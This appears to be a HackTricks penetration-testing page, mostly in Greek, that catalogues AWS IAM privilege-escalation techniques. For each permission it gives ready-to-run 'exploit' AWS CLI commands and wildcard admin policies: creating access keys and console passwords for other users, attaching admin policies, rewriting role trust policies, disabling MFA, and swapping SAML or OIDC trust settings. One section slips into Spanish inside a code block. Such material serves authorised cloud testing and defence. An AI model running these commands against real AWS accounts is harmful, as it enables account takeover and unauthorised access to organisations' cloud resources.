# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

Για περισσότερες πληροφορίες σχετικά με το IAM δείτε:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Παρέχει τη δυνατότητα δημιουργίας νέας έκδοσης policy του IAM, παρακάμπτοντας την ανάγκη για την άδεια `iam:SetDefaultPolicyVersion` με τη χρήση της σημαίας `--set-as-default`. Αυτό επιτρέπει τον ορισμό προσαρμοσμένων δικαιωμάτων.

**Exploit Command:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Επιπτώσεις:** Αυξάνει άμεσα τα προνόμια επιτρέποντας οποιαδήποτε ενέργεια σε οποιονδήποτε πόρο.

### **`iam:SetDefaultPolicyVersion`**

Επιτρέπει την αλλαγή της προεπιλεγμένης έκδοσης μιας πολιτικής IAM σε άλλη υπάρχουσα έκδοση, ενδεχομένως αυξάνοντας τα προνόμια εάν η νέα έκδοση έχει περισσότερα δικαιώματα.

**Bash Command:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Impact:** Έμμεση privilege escalation μέσω χορήγησης περισσότερων δικαιωμάτων.

### **`iam:CreateAccessKey`**

Επιτρέπει τη δημιουργία access key ID και secret access key για άλλον χρήστη, οδηγώντας σε πιθανή privilege escalation.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Επίπτωση:** Άμεση κλιμάκωση προνομίων μέσω ανάληψης των εκτεταμένων δικαιωμάτων άλλου χρήστη.

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Επιτρέπει τη δημιουργία ή ενημέρωση ενός login profile, συμπεριλαμβανομένης της ρύθμισης κωδικών για είσοδο στην κονσόλα AWS, οδηγώντας σε άμεση κλιμάκωση προνομίων.

**Exploit for Creation:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Exploit για Ενημέρωση:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Επίπτωση:** Άμεση κλιμάκωση προνομίων μέσω σύνδεσης ως "οποιοσδήποτε" χρήστης.

### **`iam:UpdateAccessKey`**

Επιτρέπει την ενεργοποίηση ενός απενεργοποιημένου access key, ενδεχομένως οδηγώντας σε μη εξουσιοδοτημένη πρόσβαση εάν ο επιτιθέμενος κατέχει το απενεργοποιημένο κλειδί.

**Exploit:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Επίπτωση:** Άμεση privilege escalation μέσω επανενεργοποίησης access keys.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Επιτρέπει τη δημιουργία ή επαναφορά διαπιστευτηρίων για συγκεκριμένες υπηρεσίες AWS (π.χ. CodeCommit, Amazon Keyspaces), κληρονομώντας τα δικαιώματα του συσχετισμένου χρήστη.

**Exploit for Creation:**
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
**Exploit για Reset:**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Επίπτωση:** Άμεση κλιμάκωση προνομίων εντός των δικαιωμάτων υπηρεσίας του χρήστη.

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Επιτρέπει την επισύναψη πολιτικών σε χρήστες ή ομάδες, κλιμακώνοντας άμεσα τα προνόμια μέσω της κληρονομιάς των δικαιωμάτων της επισυναπτόμενης πολιτικής.

**Exploit for User:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit για Group:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Impact:** Άμεση κλιμάκωση προνομίων σε οτιδήποτε επιτρέπει η policy.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Επιτρέπει την επισύναψη ή την εισαγωγή policies σε roles, users ή groups, επιτρέποντας άμεση κλιμάκωση προνομίων μέσω παραχώρησης επιπλέον δικαιωμάτων.

**Exploit για Role:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Εκμετάλλευση για ενσωματωμένες πολιτικές:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Μπορείτε να χρησιμοποιήσετε μια πολιτική όπως:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Επίπτωση:** Άμεση κλιμάκωση προνομίων προσθέτοντας δικαιώματα μέσω πολιτικών.

### **`iam:AddUserToGroup`**

Επιτρέπει σε κάποιον να προσθέσει τον εαυτό του σε μια ομάδα IAM, κλιμακώνοντας τα προνόμια με την κληρονομία των δικαιωμάτων της ομάδας.

**Εκμετάλλευση:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Επιπτώσεις:** Άμεση αναβάθμιση προνομίων στο επίπεδο των δικαιωμάτων της ομάδας.

### **`iam:UpdateAssumeRolePolicy`**

Επιτρέπει την τροποποίηση του assume role policy document ενός role, επιτρέποντας την ανάληψη του role και των συσχετιζόμενων δικαιωμάτων.

**Εκμετάλλευση:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Όταν η πολιτική έχει την εξής μορφή, δίνοντας στον χρήστη την άδεια να αναλάβει τον ρόλο:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Επίδραση:** Άμεση κλιμάκωση προνομίων με την ανάληψη των δικαιωμάτων οποιουδήποτε ρόλου.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Επιτρέπει τη μεταφόρτωση δημόσιου κλειδιού SSH για αυθεντικοποίηση στο CodeCommit και την απενεργοποίηση συσκευών MFA, οδηγώντας σε πιθανή έμμεση κλιμάκωση προνομίων.

**Εκμετάλλευση για μεταφόρτωση κλειδιού SSH:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Exploit για την απενεργοποίηση του MFA:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Επίπτωση:** Έμμεση privilege escalation με την ενεργοποίηση πρόσβασης στο CodeCommit ή την απενεργοποίηση της προστασίας MFA.

### **`iam:ResyncMFADevice`**

Επιτρέπει τον επανασυγχρονισμό μιας συσκευής MFA, ο οποίος ενδέχεται να οδηγήσει σε έμμεση privilege escalation μέσω χειρισμού της προστασίας MFA.

**Εντολή Bash:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Επίδραση:** Έμμεση κλιμάκωση προνομίων προσθέτοντας ή τροποποιώντας συσκευές MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Με αυτά τα δικαιώματα μπορείτε να **αλλάξετε τα XML μεταδεδομένα της SAML σύνδεσης**. Στη συνέχεια, μπορείτε να καταχραστείτε την **SAML federation** για να **login** με οποιοδήποτε **role που την εμπιστεύεται**.

Σημειώστε ότι κάνοντας αυτό **οι νόμιμοι χρήστες δεν θα μπορούν να κάνουν login**. Ωστόσο, μπορείτε να πάρετε το XML, να το τοποθετήσετε το δικό σας, να κάνετε login και να επαναφέρετε την προηγούμενη ρύθμιση.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
> [!NOTE]
> TODO: Ένα Tool ικανό να παράγει τα SAML metadata και να κάνει login με έναν συγκεκριμένο role

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Αβέβαιο για αυτό) Αν ένας attacker έχει αυτές τις **permissions**, θα μπορούσε να προσθέσει ένα νέο **Thumbprint** και να καταφέρει να κάνει login σε όλους τους roles που εμπιστεύονται τον provider.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

Αυτό το permissions επιτρέπει σε έναν attacker να ενημερώσει το permissions boundary ενός χρήστη, ενδεχομένως αυξάνοντας τα privileges του επιτρέποντάς του να εκτελεί ενέργειες που κανονικά περιορίζονται από τα υπάρχοντα permissions του.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

Ένας χρήστης με iam:PutRolePermissionsBoundary μπορεί να ορίσει ένα περίγραμμα δικαιωμάτων σε έναν υπάρχοντα ρόλο. Ο κίνδυνος προκύπτει όταν κάποιος με αυτήν την άδεια αλλάζει το περίγραμμα ενός ρόλου: μπορεί να περιορίσει ακατάλληλα τις λειτουργίες (προκαλώντας διακοπή υπηρεσίας) ή, εάν επισυνάψει ένα επιτρεπτικό περίγραμμα, ουσιαστικά να επεκτείνει ό,τι μπορεί να κάνει ο ρόλος και να κλιμακώσει τα προνόμια.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Αναφορές

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
